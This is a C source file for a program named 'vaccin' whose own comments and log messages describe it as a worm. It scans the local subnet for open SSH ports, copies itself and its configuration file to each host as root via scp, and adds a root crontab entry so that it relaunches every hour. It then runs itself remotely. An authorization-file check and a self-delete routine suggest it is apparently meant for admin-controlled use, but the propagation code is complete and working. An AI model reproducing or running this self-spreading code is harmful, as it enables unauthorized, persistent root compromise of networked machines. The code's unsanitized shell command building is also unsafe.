#include "../include/vaccin.h"

bool isRoot()
{
	bool ret = false;
	
	// check if the uid and euid are equals to 0
	if (getuid() == 0 && geteuid() == 0) {
		// syslog message
		syslogMsg("## Launching vaccin by root");
		ret = true;
	}

	return ret;
}

bool isSourceHost(char *adminIP)
{
	bool ret = false;
	char buf[IP_LEN];
	struct ifaddrs *myaddrs, *ifa;
	struct sockaddr_in *s4;

	// get all network interfaces available
	if (getifaddrs(&myaddrs) != 0)
		return ret;

	// for each network interface
	for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
		// if the interface uses TCP/IP
		if (ifa->ifa_addr->sa_family == AF_INET) {
			s4 = (struct sockaddr_in *) (ifa->ifa_addr);
			// if the interface has an ip address defined
			if (inet_ntop(ifa->ifa_addr->sa_family, (void *) &(s4->sin_addr), buf, sizeof(buf)) != NULL) {
				// if the ip address of the interface and the admin ip address are identical
				if (!strcmp(adminIP, buf)) {
					ret = true;
					// syslog message
					syslogMsg("## We are the administrator's host");
					break;
				}
				memset(buf, 0, sizeof(buf));
			}
		}
	}
	free(myaddrs);

	return ret;
}

char* getNetmask(char *ip)
{
	char buf[IP_LEN];
	char *netMask = NULL;
	struct ifaddrs *myaddrs, *ifa;
	struct sockaddr_in *s4, *mask;

	// get all network interfaces available
	if (getifaddrs(&myaddrs) != 0)
		return NULL;

	// for each network interface
	for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
		// if the interface uses TCP/IP
		if (ifa->ifa_addr->sa_family == AF_INET) {
			s4 = (struct sockaddr_in *) (ifa->ifa_addr);
			// if the interface has an ip address defined
			if (inet_ntop(ifa->ifa_addr->sa_family, (void *) &(s4->sin_addr), buf, sizeof(buf)) != NULL) {
				// if the ip address of the interface and the admin ip address are identical
				if (!strcmp(ip, buf)) {
					// get the network mask address
					mask = (struct sockaddr_in *) (ifa->ifa_netmask);
					inet_ntop(ifa->ifa_netmask->sa_family, (void *) &(mask->sin_addr), buf, sizeof(buf));
					netMask = (char *) malloc(strlen(buf) + 1);
					if (netMask != NULL) {
						memset(netMask, 0, strlen(buf) + 1);
						strcpy(netMask, buf);
					}

					break;
				}
				memset(buf, 0, sizeof(buf));
			}
		}
	}
	free(myaddrs);

	return netMask;
}

struct in_addr* scanNetwork(char *adminIP, char *broadcastAddr, int portSSH)
{
	struct sockaddr_in sockHostIP;
	unsigned long int nbrComputer, hostMask, i;
	int sock, compteur = 0;
	char nbrComputer_[80];
	char *msg, *adminNetworkMask;
	struct in_addr mask, broadcast, hostIP, sourceIP, *resultIP = NULL;

	// syslog message
	syslogMsg("## Launching network scan");

	// get the network mask address for the admin ip address
	adminNetworkMask = getNetmask(adminIP);
	if (adminNetworkMask == NULL)
		return NULL;

	// convert the admin ip address in the Internet dot notation
	inet_aton(adminIP, &sourceIP);

	// convert the admin network mask address in the Internet dot notation
	inet_aton(adminNetworkMask, &mask);

	// convert the broadcast address in the Internet dot notation
	inet_aton(broadcastAddr, &broadcast);

	// get the number of hosts available
	nbrComputer = ntohl(broadcast.s_addr ^ mask.s_addr);
	hostMask = sourceIP.s_addr & mask.s_addr;

	// syslog message
	sprintf(nbrComputer_, "%lu", nbrComputer);
	msg = (char *) malloc(sizeof("## Maximal number of hosts on this network : ") + strlen(nbrComputer_) + 1);
	if (msg != NULL) {
		strcpy(msg, "## Maximal number of hosts on this network : ");
		strcat(msg, nbrComputer_);
		syslogMsg(msg);
		free(msg);
	}

	// for each ip address on the network
	for (i = 1; i < nbrComputer; i++) {
		// get the target ip address
		hostIP.s_addr = htonl(ntohl(hostMask) + i);
		// if the target ip address and the admin ip address are identical
		if (strcmp(inet_ntoa(hostIP), adminIP) == 0) {
			// syslog message
			msg = (char *) malloc(sizeof("## Host administrator found : ") + strlen(adminIP) + 1);
			if (msg != NULL) {
				strcpy(msg, "## Host administrator found : ");
				strcat(msg, adminIP);
				syslogMsg(msg);
				free(msg);
			}
			continue;
		}

		// try to connect to the target on port tcp/22
		bzero(&sockHostIP, sizeof(sockHostIP));
		sock = socket(AF_INET, SOCK_STREAM, 0);
		sockHostIP.sin_family = AF_INET;
		sockHostIP.sin_port = htons(portSSH);
		sockHostIP.sin_addr = hostIP;

		// if the port 22 is open
		if (connect(sock, (struct sockaddr *) & sockHostIP, sizeof(sockHostIP)) == 0) {
			// add the ip address in the list of available ssh servers
			resultIP = (struct in_addr *) realloc(resultIP, (compteur + 1) * sizeof(struct in_addr));
			resultIP[compteur] = hostIP;
			compteur++;

			// syslog message
			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + sizeof(" tested and ssh port is open") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested and ssh port is open");
				syslogMsg(msg);
				free(msg);
			}
		}
		else { // the port 22 is close
			// syslog message
			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + sizeof(" tested") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested");
				syslogMsg(msg);
				free(msg);
			}
			continue;
		}
	}
	free(adminIP);
	free(adminNetworkMask);
	free(broadcastAddr);

	return resultIP;
}

bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *targetPath)
{
	bool ret = false;
	char command[4096];
	char *programPath;

	// init
	programPath = (char *) malloc(strlen(targetPath) + strlen(programName) + 1);
	if (programPath == NULL)
		return ret;
	// concat the target path for the program with the program name
	strcpy(programPath, targetPath);
	strcat(programPath, programName);
	sprintf(command, "%s -p %d %s \"test -f %s\"", ssh, portSSH, host, programPath);
	free(programPath);
	printf("command : %s\n", command);
	// test if the worm is present on the remote host
	if (system(command) == 0)
		ret = true;

	return ret;
}

bool colonize(char *host, char *programPath, char *ssh, int portSSH, char *scp, char *targetPath, char *crontab)
{
	bool ret = false;
	int exec;
	char command[4096];
	char *msg, *dir, *config, *targetWormPath;

	// get the directory where is the worm
	dir = (char *) malloc(strlen(programPath));
	if (dir == NULL)
		return ret;
	strcpy(dir, programPath);
	dirname(dir);
	// get the path of the configuration file
	config = (char *) malloc(strlen(dir) + strlen(CONFIG_FILE) + 2);
	if (config == NULL)
		return ret;
	strcpy(config, dir);
	strcat(config, "/");
	strcat(config, CONFIG_FILE);

	// get the path of the worm on a target
	targetWormPath = (char *) malloc(strlen(targetPath) + strlen(basename(programPath)) + 1);
	if (targetWormPath == NULL)
		return ret;
	strcpy(targetWormPath, targetPath);
	strcat(targetWormPath, basename(programPath));

	// syslog message
	msg = (char *) malloc(sizeof("## colonization of ") + strlen(host) + 1);
	if (msg != NULL) {
		strcpy(msg, "## colonization of ");
		strcat(msg, host);
		syslogMsg(msg);
		free(msg);
	}

	// copy the program on the target host
	sprintf(command, "%s -P %d %s root@%s:%s", scp, portSSH, programPath, host, targetPath);
	exec = system(command);
	// if the command succeeded
	if (exec == 0 ) {
		// syslog message
		msg = (char *) malloc(sizeof("## worm copy on %s") + strlen(host) + 1);
		if (msg != NULL) {
			strcpy(msg, "## worm copy on ");
			strcat(msg, host);
			syslogMsg(msg);
			free(msg);
		}

		// copy the configuration file on the target host
		memset(command, 0, 4096);
		sprintf(command, "%s -P %d %s root@%s:%s", scp, portSSH, config, host, targetPath);
		exec = system(command);
		// if the command succeeded
		if (exec == 0) {
			// restore the root crontav on the target host
			memset(command, 0, 4096);
			sprintf(command, "%s -p %d root@%s \" if test -f %s ; then cat %s | grep -v %s > %s ; fi \"", ssh, portSSH, host, crontab, crontab, targetWormPath, crontab);
			exec = system(command);
			if (exec == 0 || exec == 256) {
				// update the root crontab on the target host
				memset(command, 0, 4096);
				sprintf(command, "%s -p %d root@%s \" echo 0 \\* \\* \\* \\* %s >> %s \"", ssh, portSSH, host, targetWormPath, crontab);
				exec = system(command);
				// if the command succeeded
				if (exec == 0) {
					// syslog message
					msg = (char *) malloc(sizeof("## Automatic launch configuration for %s") + strlen(host) + 1);
					if (msg != NULL) {
						strcpy(msg, "## Automatic launch configuration for ");
						strcat(msg, host);
						syslogMsg(msg);
						free(msg);
					}

					// launch remote program
					memset(command, 0, 4096);
					sprintf(command, "%s -p %d root@%s \"%s\"", ssh, portSSH, host, targetWormPath);
					exec = system(command);
					// if the command succeeded
					if (exec == 0) {
						// syslog message
						msg = (char *) malloc(sizeof("## First worm execution on ") + strlen(host) + 1);
						if (msg != NULL) {
							strcpy(msg, "## First worm execution on ");
							strcat(msg, host);
							syslogMsg(msg);
							free(msg);
						}
						ret = true;
					}
				}
			}
		}
	}
	free(dir);
	free(config);
	free(targetWormPath);

	return ret;
}

bool isAuthorized(char *control)
{
	bool ret = false;

	if (access(control, R_OK) == 0) {
		syslogMsg("## Vaccin is authorized on this host");
		ret = true;
	}
	else {
		syslogMsg("## Vaccin is not authorized on this host");
		ret = false;
	}
	return ret;
}


bool wormDelete(char *programName, char *targetPath, char *crontab) {
	bool ret = false;
	int exec;
	char command[4096];
	char *msg, *targetWormPath, *config;

	// get the target worm path
	targetWormPath = (char *) malloc(strlen(targetPath) + strlen(basename(programName)) + 1);
	if (targetWormPath == NULL)
		return ret;
	strcpy(targetWormPath, targetPath);
	strcat(targetWormPath, basename(programName));

	// get the configuration file path
	config = (char *) malloc(strlen(targetPath) + strlen(CONFIG_FILE) + 1);
	if (config == NULL)
		return ret;
	strcpy(config, targetPath);
	strcat(config, CONFIG_FILE);

	// restore root crontab
	memset(command, 0, 4096);
	sprintf(command, "if test -f %s ; then cat %s | grep -v %s > %s ; fi", crontab, crontab, targetWormPath, crontab);
	exec = system(command);
	if (exec == 0 || exec == 256) {
		// syslog message
		syslogMsg("## Delete automatic launch configuration");

		// delete the program
		memset(command, 0, 4096);
		sprintf(command, "if test -f %s; then rm -f %s ; fi", targetWormPath, targetWormPath);
		exec = system(command);
		if (exec == 0) {
			// syslog message
			msg = (char *) malloc(sizeof("## Delete vaccin file : ") + strlen(targetWormPath) + 1);
			if (msg != NULL) {
				strcpy(msg, "## Delete vaccin file : ");
				strcat(msg, targetWormPath);
				syslogMsg(msg);
				free(msg);
			}

			// delete the configuration file
			memset(command, 0, 4096);
			sprintf(command, "if test -f %s; then rm -f %s ; fi", config, config);
			exec = system(command);
			if (exec == 0) {
				// syslog message
				msg = (char *) malloc(sizeof("## Delete vaccin configuration file : ") + strlen(config));
				if (msg != NULL) {
					strcpy(msg, "## Delete vaccin configuration file : ");
					strcat(msg, config);
					syslogMsg(msg);
					free(msg);
				}
				ret = true;
				syslogMsg("## Successfully deletion of vaccin");
			}
		}
	}	

	free(targetWormPath);
	free(config);

	return ret;
}

